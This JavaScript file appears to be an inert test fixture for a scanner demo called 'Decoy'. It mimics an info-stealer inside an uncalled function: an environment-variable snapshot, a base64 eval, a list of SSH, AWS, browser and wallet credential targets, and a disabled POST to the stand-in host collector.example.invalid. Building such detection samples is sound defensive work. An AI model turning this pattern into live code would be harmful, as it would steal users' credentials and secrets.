// SIMULATED. Mimics an info-stealer's structure for the Decoy demo.
// INERT BY DESIGN: everything is inside a function that nothing calls, so running this file does nothing.
// Decoy reads the text without running it, so it still finds every pattern below. Do not run this file anyway.

function simulatedStealerNeverCalled() {
  // 1) "Collects" all environment variables.
  const snapshot = JSON.stringify(process.env);
  const found = snapshot.includes("DEMO_API_KEY");

  // 2) Hidden payload: base64 that decodes to a console.log.
  const payload = Buffer.from("Y29uc29sZS5sb2coJ1tERUNPWSBERU1PXSBwYXlsb2FkIHdvdWxkIHJ1biBoZXJlJyk=", "base64").toString();
  eval(payload);

  // 3) Targets a real stealer would look for (never read here).
  const TARGETS = ["~/.ssh/id_rsa", "~/.aws/credentials", "Chrome/Default/Login Data", "MetaMask"];

  // 4) Exfiltration endpoint: .invalid can never resolve, and the call is disabled as well.
  if (false) fetch("https://collector.example.invalid/upload", { method: "POST", body: snapshot });

  return { found, targets: TARGETS.length };
}
